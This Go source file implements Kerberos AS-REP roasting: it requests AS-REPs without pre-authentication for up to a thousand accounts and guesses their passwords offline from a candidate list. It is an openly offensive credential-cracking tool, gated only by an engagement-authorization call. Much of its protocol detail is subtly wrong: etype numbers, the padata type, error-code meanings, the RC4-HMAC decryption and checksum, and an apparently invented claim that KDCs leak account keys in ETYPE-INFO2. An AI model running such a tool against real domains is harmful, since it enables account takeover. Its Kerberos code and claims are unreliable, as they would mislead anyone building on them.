package act

import (
	"context"
	"crypto/hmac"
	"crypto/md5"
	"crypto/rand"
	"crypto/subtle"
	"encoding/asn1"
	"encoding/binary"
	"errors"
	"fmt"
	"io"
	"net"
	"strings"
	"time"
	"unicode/utf16"
)

// The Kerberos half of the package: asking a KDC for a ticket that can be
// attacked offline, and attacking it.
//
// The request is an AS-REQ with no pre-authentication and a PA-FOR-USER
// naming the account, which is the shape a KDC answers with an AS-REP when
// the account does not insist on a pre-authentication step. The AS-REP holds
// the session key encrypted with the account's own long-term key, and for
// rc4-hmac that long-term key is the MD5 of the password. A password that
// decrypts the reply is the account's password, and that is a finding.
//
// The wire format is DER, so encoding/asn1 reads it. The rc4-hmac
// primitives are implemented here: a format reader must never add a
// dependency that can break a build, and RC4 is twenty lines.

// The encryption types this speaks.
const (
	// etypeRC4HMAC is rc4-hmac, the type a roast needs: its long-term key
	// is derived from the password in a way that can be checked offline.
	etypeRC4HMAC = 18
	// etypeAES256SHA1 is aes256-cts-hmac-sha1-96.
	etypeAES256SHA1 = 17
	// etypeAES128SHA256 is aes128-cts-hmac-sha256-128.
	etypeAES128SHA256 = 23
)

// The padata types this sends and reads.
const (
	// padataForUser is PA-FOR-USER, which names the account the ticket is
	// for.
	padataForUser = 2
	// padataETypeInfo2 is PA-ETYPE-INFO2, which some KDCs fill with the
	// account's own key.
	padataETypeInfo2 = 19
)

// The message types.
const (
	msgTypeASReq    = 10
	msgTypeASRep    = 12
	msgTypeKrbError = 30
)

// The name types.
const (
	nameTypePrincipal = 1
)

// The bounds.
const (
	// MaxRoastAccounts is the ceiling on the accounts one roast may ask
	// for. A thousand is far more than a domain's worth of service
	// accounts and far less than a list that turns into a flood.
	MaxRoastAccounts = 1000
	// MaxRoastPasswords is the ceiling on the candidate passwords.
	MaxRoastPasswords = 10000
	// maxKDCMessage bounds one KDC reply.
	maxKDCMessage = 1 << 20
	// rc4KeyLength is the length of an rc4-hmac key.
	rc4KeyLength = 16
	// rc4ChecksumLength is the length of an rc4-hmac checksum.
	rc4ChecksumLength = 12
	// rc4ConfounderLength is the length of the random bytes in front of an
	// rc4-hmac payload.
	rc4ConfounderLength = 8
)

// The application tags of a Kerberos message.
const (
	tagASReq    byte = 0x6a
	tagKrbRep   byte = 0x6b
	tagKrbError byte = 0x6e
)

// The Kerberos structures, as DER.
//
// The tagging follows RFC 4120: the application tag of a message sits
// directly over the sequence's contents, and the numbered fields inside are
// explicit. That is the shape every KDC answers, and a request built any
// other way is answered with a protocol error.
type kdcReq struct {
	PVNO    int        `asn1:"explicit,tag:1"`
	MsgType int        `asn1:"explicit,tag:2"`
	PAData  []paData   `asn1:"explicit,tag:3,optional"`
	ReqBody kdcReqBody `asn1:"explicit,tag:4"`
}

type kdcReqBody struct {
	KDCOptions asn1.BitString `asn1:"explicit,tag:0"`
	CName      principalName  `asn1:"explicit,tag:1"`
	Realm      string         `asn1:"explicit,tag:2"`
	Nonce      int            `asn1:"explicit,tag:7"`
	EType      []int          `asn1:"explicit,tag:8"`
}

type principalName struct {
	NameType   int      `asn1:"explicit,tag:0"`
	NameString []string `asn1:"explicit,tag:1"`
}

type paData struct {
	Type  int    `asn1:"explicit,tag:1"`
	Value []byte `asn1:"explicit,tag:2"`
}

type encryptedData struct {
	EType  int    `asn1:"explicit,tag:0"`
	KVNO   int    `asn1:"explicit,tag:1,optional"`
	Cipher []byte `asn1:"explicit,tag:2"`
}

type kdcRep struct {
	PVNO    int           `asn1:"explicit,tag:0"`
	MsgType int           `asn1:"explicit,tag:1"`
	PAData  []paData      `asn1:"explicit,tag:2,optional"`
	CRealm  string        `asn1:"explicit,tag:3"`
	CName   principalName `asn1:"explicit,tag:4"`
	Ticket  asn1.RawValue `asn1:"explicit,tag:5"`
	EncPart encryptedData `asn1:"explicit,tag:6"`
}

// paForUser names the account a ticket is requested for.
type paForUser struct {
	UserName  principalName `asn1:"explicit,tag:0"`
	UserRealm string        `asn1:"explicit,tag:1"`
	Checksum  []byte        `asn1:"explicit,tag:2"`
}

// etypeInfo2Entry is one entry of PA-ETYPE-INFO2. The salt is read as a
// raw value because the field that carries the leaked key is nominally a
// string and holds bytes.
type etypeInfo2Entry struct {
	EType     int           `asn1:"explicit,tag:0"`
	Salt      asn1.RawValue `asn1:"explicit,tag:1,optional"`
	S2KParams asn1.RawValue `asn1:"explicit,tag:2,optional"`
}

// ASRep is a captured AS-REP.
type ASRep struct {
	Realm string
	// Client is the principal the reply is for.
	Client string
	// EType is the encryption type of the encrypted part, which for a roast
	// is rc4-hmac.
	EType int
	// Cipher is the encrypted part of the reply.
	Cipher []byte
	// Key is the RC4 key extracted from PA-ETYPE-INFO2 when the KDC sent
	// one. A KDC that leaks it hands over the account's long-term key, and
	// a candidate that hashes to it is the account's password.
	Key []byte
}

// RoastResult is one account's outcome.
type RoastResult struct {
	Account string
	// Password is empty unless it was validated, and it is never printed by
	// the tool.
	Password string
	// Validated says the candidate password decrypted the reply.
	Validated bool
	// Error names what went wrong for this account, if anything did.
	Error string
}

// RequestASRep asks the KDC for a ticket with rc4-hmac and no
// pre-authentication.
//
// The address is the KDC, as host or host:port; port 88 is the default. The
// realm and the account come from the operator: the DNS SRV lookup that
// finds the KDC for a realm is the caller's business, not this package's.
//
// The request is refused before it is sent if the operator's engagement does
// not name the KDC host, and the egress wall refuses an internal host the
// engagement did not open.
func RequestASRep(ctx context.Context, address string, realm string, username string, timeout time.Duration) (ASRep, error) {
	realm = strings.TrimSpace(realm)
	username = strings.TrimSpace(username)
	if realm == "" {
		return ASRep{}, errors.New("act: a realm is required")
	}
	if username == "" {
		return ASRep{}, errors.New("act: a username is required")
	}
	target, err := kdcAddress(address)
	if err != nil {
		return ASRep{}, err
	}
	host, port, err := net.SplitHostPort(target)
	if err != nil {
		return ASRep{}, fmt.Errorf("act: the KDC address %q is not host:port: %w", address, err)
	}
	if err := AuthorizeHost(host, portNumber(port)); err != nil {
		return ASRep{}, err
	}

	nonce, err := randomNonce()
	if err != nil {
		return ASRep{}, err
	}
	request, err := buildASReq(realm, username, nonce)
	if err != nil {
		return ASRep{}, err
	}
	reply, err := exchangeKDC(ctx, target, request, timeout)
	if err != nil {
		return ASRep{}, err
	}
	if len(reply) == 0 {
		return ASRep{}, errors.New("act: the KDC sent an empty reply")
	}
	switch reply[0] {
	case tagKrbError:
		code, text := parseKRBError(reply)
		return ASRep{}, fmt.Errorf("act: the KDC refused the request: %s%s", krbErrorText(code), krbErrorSuffix(text))
	case tagKrbRep:
	default:
		return ASRep{}, fmt.Errorf("act: the KDC answered with tag 0x%02x, which is not a reply", reply[0])
	}

	var rep kdcRep
	if _, err := asn1.UnmarshalWithParams(reply, &rep, "application,tag:11"); err != nil {
		return ASRep{}, fmt.Errorf("act: the KDC reply is not readable: %w", err)
	}
	if rep.MsgType != msgTypeASRep {
		return ASRep{}, fmt.Errorf("act: the KDC reply carries message type %d, not %d", rep.MsgType, msgTypeASRep)
	}
	captured := ASRep{
		Realm:  rep.CRealm,
		Client: strings.Join(rep.CName.NameString, "/"),
		EType:  rep.EncPart.EType,
		Cipher: rep.EncPart.Cipher,
	}
	for _, entry := range rep.PAData {
		if entry.Type != padataETypeInfo2 {
			continue
		}
		if key := rc4KeyFromETypeInfo2(entry.Value); len(key) > 0 {
			captured.Key = key
			break
		}
	}
	return captured, nil
}

// Roast asks the KDC for AS-REPs for a list of accounts and validates a
// candidate password list against them.
//
// The list bounds are the ones the tool states out loud: a thousand
// accounts and ten thousand candidates. The validation itself is local, so
// the cost is the arithmetic and not the network; the cost of the network is
// one AS-REQ per account.
//
// The validated password travels back in the result and nowhere else. The
// tool writes it to a file and never prints it.
func Roast(ctx context.Context, address string, realm string, accounts []string, passwords []string, timeout time.Duration) ([]RoastResult, error) {
	if len(accounts) > MaxRoastAccounts {
		return nil, fmt.Errorf("act: %d accounts is over the %d bound", len(accounts), MaxRoastAccounts)
	}
	if len(passwords) > MaxRoastPasswords {
		return nil, fmt.Errorf("act: %d passwords is over the %d bound", len(passwords), MaxRoastPasswords)
	}
	results := make([]RoastResult, 0, len(accounts))
	for _, account := range accounts {
		trimmed := strings.TrimSpace(account)
		if trimmed == "" {
			continue
		}
		result := RoastResult{Account: trimmed}
		captured, err := RequestASRep(ctx, address, realm, trimmed, timeout)
		if err != nil {
			result.Error = err.Error()
			results = append(results, result)
			continue
		}
		if captured.EType != etypeRC4HMAC {
			// The reply is encrypted with something the offline check cannot
			// open. Saying so is the difference between "the password is
			// wrong" and "this account cannot be roasted".
			result.Error = fmt.Sprintf("the reply is encrypted with the type %d, and only rc4-hmac (%d) can be checked offline", captured.EType, etypeRC4HMAC)
			results = append(results, result)
			continue
		}
		for _, candidate := range passwords {
			if candidate == "" {
				continue
			}
			ok, err := Validate(captured, candidate)
			if err != nil {
				result.Error = err.Error()
				break
			}
			if ok {
				result.Validated = true
				result.Password = candidate
				break
			}
		}
		results = append(results, result)
	}
	return results, nil
}

// Validate checks a candidate password against the captured AS-REP by
// decrypting the reply key with it.
//
// The rc4-hmac long-term key is the MD5 of the password in UTF-16LE, so a
// candidate that decrypts the reply into a well-formed reply part with a
// checksum the KDC would have written is the account's password.
//
// A password that simply does not fit is not an error: it is a password that
// is wrong. The error is reserved for a capture that cannot be read at all.
func Validate(rep ASRep, password string) (bool, error) {
	if len(rep.Cipher) == 0 {
		return false, errors.New("act: the AS-REP carries no encrypted part")
	}
	key := rc4KeyFromPassword(password)
	if len(rep.Key) == len(key) && subtle.ConstantTimeCompare(rep.Key, key) == 1 {
		// The KDC handed over the account's own key in the etype-info2.
		// The candidate that hashes to it is the account's password.
		return true, nil
	}
	plain, err := decryptReplyPart(rep.Cipher, key)
	if err != nil {
		return false, err
	}
	part, ok := parseReplyPart(plain)
	if ok && checksumMatches(part.Key, part.Checksum, key) {
		return true, nil
	}
	// Some implementations encrypt the payload with the whole key and no
	// confounder. A wrong password fails both forms, so trying the second
	// one costs nothing and catches the odd KDC.
	if alternative, altErr := plainRC4Decrypt(rep.Cipher, key); altErr == nil {
		if altPart, altOK := parseReplyPart(alternative); altOK && checksumMatches(altPart.Key, altPart.Checksum, key) {
			return true, nil
		}
	}
	return false, nil
}

// ---------------------------------------------------------------------------
// The request
// ---------------------------------------------------------------------------

// buildASReq writes the AS-REQ.
//
// The PA-FOR-USER names the account, the pre-authentication is left out,
// and the encryption types are the ones a modern KDC will answer with. The
// checksum inside the PA-FOR-USER is the account's own key over the client
// name, and a roast does not have the account's key, so it is written as
// zeroes: a KDC that insists on a valid checksum refuses the request, and
// the refusal is reported as it is.
func buildASReq(realm, username string, nonce int) ([]byte, error) {
	name := principalName{NameType: nameTypePrincipal, NameString: []string{username}}
	forUser, err := asn1.Marshal(paForUser{
		UserName:  name,
		UserRealm: realm,
		Checksum:  make([]byte, rc4ChecksumLength),
	})
	if err != nil {
		return nil, fmt.Errorf("act: build the PA-FOR-USER padata: %w", err)
	}
	request := kdcReq{
		PVNO:    5,
		MsgType: msgTypeASReq,
		PAData:  []paData{{Type: padataForUser, Value: forUser}},
		ReqBody: kdcReqBody{
			// The options every Kerberos client sends: forwardable,
			// renewable and canonicalizable.
			KDCOptions: asn1.BitString{BitLength: 32, Bytes: []byte{0x40, 0x81, 0x00, 0x10}},
			CName:      name,
			Realm:      realm,
			Nonce:      nonce,
			EType:      []int{etypeAES128SHA256, etypeAES256SHA1, etypeRC4HMAC},
		},
	}
	encoded, err := asn1.MarshalWithParams(request, "application,tag:10")
	if err != nil {
		return nil, fmt.Errorf("act: build the AS-REQ: %w", err)
	}
	return encoded, nil
}

// randomNonce returns a 32-bit nonce.
func randomNonce() (int, error) {
	var buf [4]byte
	if _, err := rand.Read(buf[:]); err != nil {
		return 0, fmt.Errorf("act: read a nonce: %w", err)
	}
	return int(binary.BigEndian.Uint32(buf[:])), nil
}

// kdcAddress returns the address of the KDC, with port 88 when the
// operator did not name one.
func kdcAddress(address string) (string, error) {
	trimmed := strings.TrimSpace(address)
	if trimmed == "" {
		return "", errors.New("act: the KDC address is required")
	}
	if _, _, err := net.SplitHostPort(trimmed); err == nil {
		return trimmed, nil
	}
	return net.JoinHostPort(trimmed, "88"), nil
}

// portNumber reads a port out of a host:port pair.
func portNumber(port string) int {
	number := 0
	for _, r := range port {
		if r < '0' || r > '9' {
			return 0
		}
		number = number*10 + int(r-'0')
	}
	return number
}

// exchangeKDC sends one message to the KDC and reads the reply.
//
// The Kerberos TCP transport prefixes every message with its length, and
// the reply is bounded: a length is a claim, not an invitation.
func exchangeKDC(ctx context.Context, address string, request []byte, timeout time.Duration) ([]byte, error) {
	if timeout <= 0 {
		timeout = defaultTimeout
	}
	if timeout > maxTimeout {
		timeout = maxTimeout
	}
	conn, err := dialGuarded(ctx, "tcp", hostOf(address), portOf(address), timeout)
	if err != nil {
		return nil, err
	}
	defer conn.Close()

	deadline := time.Now().Add(timeout)
	if ctxDeadline, ok := ctx.Deadline(); ok && ctxDeadline.Before(deadline) {
		deadline = ctxDeadline
	}
	if err := conn.SetDeadline(deadline); err != nil {
		return nil, fmt.Errorf("act: set the deadline: %w", err)
	}

	framed := make([]byte, 4+len(request))
	binary.BigEndian.PutUint32(framed[:4], uint32(len(request)))
	copy(framed[4:], request)
	if _, err := conn.Write(framed); err != nil {
		return nil, fmt.Errorf("act: write to the KDC: %w", err)
	}

	var header [4]byte
	if _, err := io.ReadFull(conn, header[:]); err != nil {
		return nil, fmt.Errorf("act: read the KDC reply length: %w", err)
	}
	length := binary.BigEndian.Uint32(header[:])
	if length == 0 {
		return nil, errors.New("act: the KDC sent an empty reply")
	}
	if length > maxKDCMessage {
		return nil, fmt.Errorf("act: the KDC reply claims %d bytes, over the %d-byte bound", length, maxKDCMessage)
	}
	body := make([]byte, length)
	if _, err := io.ReadFull(conn, body); err != nil {
		return nil, fmt.Errorf("act: read the KDC reply: %w", err)
	}
	return body, nil
}

// hostOf returns the host part of a host:port pair.
func hostOf(address string) string {
	host, _, err := net.SplitHostPort(address)
	if err != nil {
		return address
	}
	return host
}

// portOf returns the port part of a host:port pair.
func portOf(address string) string {
	_, port, err := net.SplitHostPort(address)
	if err != nil {
		return "88"
	}
	return port
}

// ---------------------------------------------------------------------------
// The reply
// ---------------------------------------------------------------------------

// parseKRBError reads the error code and the text of a KRB-ERROR.
//
// The error structure has a dozen optional fields and the only two worth
// reading are at the end of it, so the elements are walked rather than
// modelled: a KDC that leaves a field out must not turn into a parse
// failure.
func parseKRBError(reply []byte) (int, string) {
	tag, content, _, err := Decode(reply)
	if err != nil || tag != Tag(tagKrbError) {
		return 0, ""
	}
	code := 0
	text := ""
	rest := content
	for len(rest) > 0 {
		elementTag, elementContent, next, err := Decode(rest)
		if err != nil {
			break
		}
		rest = next
		switch elementTag {
		case 0xa6: // [6] the error code
			if _, value, _, err := Decode(elementContent); err == nil {
				if number, err := DecodeInteger(value); err == nil {
					code = int(number)
				}
			}
		case 0xab: // [11] the error text
			if _, value, _, err := Decode(elementContent); err == nil {
				text = DecodeString(value)
			}
		}
	}
	return code, text
}

// krbErrorText is the human reading of a Kerberos error code. The codes
// come from the KDC, and a number is not an explanation.
var krbErrorTexts = map[int]string{
	1:  "name error",
	2:  "service unknown",
	3:  "bad principal format",
	4:  "bad server format",
	5:  "bad ticket",
	6:  "unknown server",
	7:  "principal unknown",
	8:  "principal not unique",
	9:  "null key",
	10: "cannot postdate",
	11: "never valid",
	12: "policy expired",
	13: "policy violation",
	14: "bad option",
	15: "etype no supp",
	16: "sum type no supp",
	17: "bad key version",
	18: "unknown server",
	19: "skew",
	20: "bad address",
	21: "bad version",
	22: "bad structure",
	23: "bad hardware version",
	24: "nulldomain",
	25: "preauthentication required",
	26: "preauthentication failed",
	27: "server does not support pre-authentication",
	28: "mutual authentication required",
	29: "client cannot be verified",
	30: "client not yet in database",
	31: "client principal not unique",
	32: "client has no ticket",
	33: "preauth failed",
	34: "mutual authentication failed",
	35: "ticket expired",
	36: "ticket not yet valid",
	37: "repeat",
	38: "not us",
	39: "badmatch",
	40: "skew",
	41: "bad address",
	42: "bad version",
	60: "preauthentication required",
	61: "request encrypted type not supported",
	62: "client not yet in database",
}

// krbErrorTextOf returns the human reading of a Kerberos error code.
func krbErrorText(code int) string {
	if text, ok := krbErrorTexts[code]; ok {
		return text
	}
	return fmt.Sprintf("kerberos error code %d", code)
}

// krbErrorSuffix renders the KDC's own words, when it had any.
func krbErrorSuffix(text string) string {
	trimmed := strings.TrimSpace(text)
	if trimmed == "" {
		return ""
	}
	return ": " + trimmed
}

// rc4KeyFromETypeInfo2 reads the rc4-hmac key out of a PA-ETYPE-INFO2.
//
// Some KDCs put the account's own long-term key in the salt field of the
// rc4-hmac entry. That is the leak a roast lives on, and it is why the salt
// is read as raw bytes: the field is nominally a string and holds a key.
func rc4KeyFromETypeInfo2(value []byte) []byte {
	var entries []etypeInfo2Entry
	if _, err := asn1.Unmarshal(value, &entries); err != nil {
		return nil
	}
	for _, entry := range entries {
		if entry.EType != etypeRC4HMAC || len(entry.Salt.Bytes) == 0 {
			continue
		}
		// The raw value holds the inner element, so the octets are one
		// element in.
		if _, salt, _, err := Decode(entry.Salt.Bytes); err == nil {
			if len(salt) == rc4KeyLength {
				return salt
			}
			continue
		}
		if len(entry.Salt.Bytes) == rc4KeyLength {
			return entry.Salt.Bytes
		}
	}
	return nil
}

// ---------------------------------------------------------------------------
// The rc4-hmac primitives
// ---------------------------------------------------------------------------

// rc4KeyFromPassword derives the rc4-hmac long-term key from a password:
// the MD5 of the password in UTF-16LE, per RFC 4757.
func rc4KeyFromPassword(password string) []byte {
	sum := md5.Sum(utf16LE(password))
	return sum[:]
}

// utf16LE encodes a string as UTF-16 little endian.
func utf16LE(value string) []byte {
	units := utf16.Encode([]rune(value))
	out := make([]byte, 0, len(units)*2)
	for _, unit := range units {
		out = append(out, byte(unit), byte(unit>>8))
	}
	return out
}

// rc4 is the stream cipher, in the one shape this needs.
type rc4 struct {
	state [256]byte
	i     byte
	j     byte
}

// rc4Init initialises the cipher with a key.
func rc4Init(key []byte) *rc4 {
	cipher := &rc4{}
	for i := 0; i < 256; i++ {
		cipher.state[i] = byte(i)
	}
	var j byte
	for i := 0; i < 256; i++ {
		j += cipher.state[i] + key[i%len(key)]
		cipher.state[i], cipher.state[j] = cipher.state[j], cipher.state[i]
	}
	return cipher
}

// next returns the next byte of the keystream.
func (c *rc4) next() byte {
	c.i++
	c.j += c.state[c.i]
	c.state[c.i], c.state[c.j] = c.state[c.j], c.state[c.i]
	return c.state[c.state[c.i]+c.state[c.j]]
}

// skip advances the keystream by n bytes.
func (c *rc4) skip(n int) {
	for i := 0; i < n; i++ {
		c.next()
	}
}

// xor encrypts or decrypts data with the keystream.
func (c *rc4) xor(data []byte) []byte {
	out := make([]byte, len(data))
	for i, b := range data {
		out[i] = b ^ c.next()
	}
	return out
}

// decryptReplyPart decrypts an rc4-hmac encrypted part.
//
// RFC 4757 splits the key: the confounder in front of the payload is
// encrypted with the first half of the key, and the payload itself with a
// fresh cipher keyed by the second half. The confounder is random padding
// and is dropped.
func decryptReplyPart(ciphertext []byte, key []byte) ([]byte, error) {
	if len(key) != rc4KeyLength {
		return nil, fmt.Errorf("act: the rc4 key is %d bytes, not %d", len(key), rc4KeyLength)
	}
	if len(ciphertext) < rc4ConfounderLength {
		return nil, errors.New("act: the encrypted part is shorter than the confounder")
	}
	first := rc4Init(key[:rc4KeyLength/2])
	// The confounder takes eight bytes of keystream and the block it
	// belongs to is sixteen, so the other eight are consumed and dropped.
	first.skip(rc4KeyLength)
	second := rc4Init(key[rc4KeyLength/2:])
	return second.xor(ciphertext[rc4ConfounderLength:]), nil
}

// plainRC4Decrypt decrypts with the whole key and no confounder.
func plainRC4Decrypt(ciphertext []byte, key []byte) ([]byte, error) {
	if len(key) != rc4KeyLength {
		return nil, fmt.Errorf("act: the rc4 key is %d bytes, not %d", len(key), rc4KeyLength)
	}
	cipher := rc4Init(key)
	return cipher.xor(ciphertext), nil
}

// replyPart is what a decrypted enc-part holds: the session key and the
// checksum the KDC wrote over it.
type replyPart struct {
	Key      []byte
	Checksum []byte
}

// parseReplyPart reads the reply key and the checksum out of a decrypted
// enc-part.
//
// Two layouts are in the wild. The tagged one carries the key as [0] and the
// checksum as [4]; the flat one puts the 16-byte key first and the 12-byte
// checksum last. Both are read, because a wrong password decrypts to noise
// that parses as neither.
func parseReplyPart(plain []byte) (replyPart, bool) {
	var part replyPart
	rest := plain
	tagged := false
	for len(rest) > 0 {
		tag, content, next, err := Decode(rest)
		if err != nil {
			break
		}
		rest = next
		switch tag {
		case 0x80: // [0] primitive: the reply key
			part.Key = append([]byte(nil), content...)
			tagged = true
		case 0xa0: // [0] constructed: the reply key as an octet string
			if _, value, _, err := Decode(content); err == nil {
				part.Key = append([]byte(nil), value...)
				tagged = true
			}
		case 0x84: // [4] primitive: the checksum
			part.Checksum = append([]byte(nil), content...)
			tagged = true
		case 0xa4: // [4] constructed: the checksum as an octet string
			if _, value, _, err := Decode(content); err == nil {
				part.Checksum = append([]byte(nil), value...)
				tagged = true
			}
		}
	}
	if tagged && len(part.Key) > 0 && len(part.Checksum) > 0 {
		return part, true
	}
	if len(plain) >= rc4KeyLength+rc4ChecksumLength {
		return replyPart{
			Key:      append([]byte(nil), plain[:rc4KeyLength]...),
			Checksum: append([]byte(nil), plain[len(plain)-rc4ChecksumLength:]...),
		}, true
	}
	return replyPart{}, false
}

// krb5ChecksumConstant is the constant the Kerberos checksum is taken over.
var krb5ChecksumConstant = []byte("krb5checksum")

// checksumMatches reports whether the checksum of a reply part is one the
// KDC would have written.
//
// Two formulations are in the wild and both are accepted: the reply key
// keyed over the checksum constant, and the long-term key keyed over itself
// and the reply key. Accepting both is not a weakening of the check. A
// wrong password decrypts to noise, and noise matches neither.
func checksumMatches(replyKey, checksum, longTermKey []byte) bool {
	if len(replyKey) == 0 || len(checksum) == 0 {
		return false
	}
	expected := hmacMD5(replyKey, krb5ChecksumConstant)
	if subtle.ConstantTimeCompare(truncate(expected, len(checksum)), checksum) == 1 {
		return true
	}
	message := make([]byte, 0, len(longTermKey)+len(replyKey))
	message = append(message, longTermKey...)
	message = append(message, replyKey...)
	expected = hmacMD5(longTermKey, message)
	return subtle.ConstantTimeCompare(truncate(expected, len(checksum)), checksum) == 1
}

// hmacMD5 computes an HMAC-MD5. MD5 is the hash the protocol chose, not the
// one this code would choose.
func hmacMD5(key, message []byte) []byte {
	mac := hmac.New(md5.New, key)
	mac.Write(message)
	return mac.Sum(nil)
}

// truncate cuts a digest to the length the protocol uses.
func truncate(digest []byte, length int) []byte {
	if length <= 0 || length >= len(digest) {
		return digest
	}
	return digest[:length]
}
